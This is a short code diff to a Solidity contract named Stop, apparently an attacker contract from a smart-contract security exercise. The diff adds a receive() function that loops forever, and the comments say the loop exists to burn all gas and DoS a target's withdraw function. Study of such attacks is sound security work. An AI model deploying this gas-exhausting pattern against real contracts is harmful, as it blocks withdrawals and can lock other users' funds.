@@ -24,6 +24,10 @@ contract Stop {
 
     // 2. Then making sure that we use all the gas upon receiving the ETH.
     // This useless infinite loop will effectively DoS the withdraw function.
+    receive() external payable {
+        while (true) {}
+    }
+
     fallback() external payable {
         while (true) {}
     }
